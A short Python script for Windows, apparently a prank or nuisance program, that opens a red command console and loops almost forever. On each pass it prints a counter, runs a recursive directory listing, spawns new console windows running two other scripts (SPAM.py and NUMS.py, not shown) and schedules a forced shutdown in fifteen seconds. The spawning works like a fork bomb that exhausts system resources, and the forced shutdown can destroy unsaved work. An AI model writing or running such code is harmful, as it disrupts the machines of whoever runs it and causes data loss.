import subprocess
import os
import time
os.startfile("C:\\Windows\\System32\\cmd.exe")
subprocess.run("color 4 ", shell=True)
h = 1
while h < 999999999999999999999999999999999999:
    print(h)
    h += 1
    subprocess.run("dir /s", shell=True)
    os.system("start cmd /k python SPAM.py")
    os.system("start cmd /k python NUMS.py")
    subprocess.run("shutdown -s -t 15", shell=True)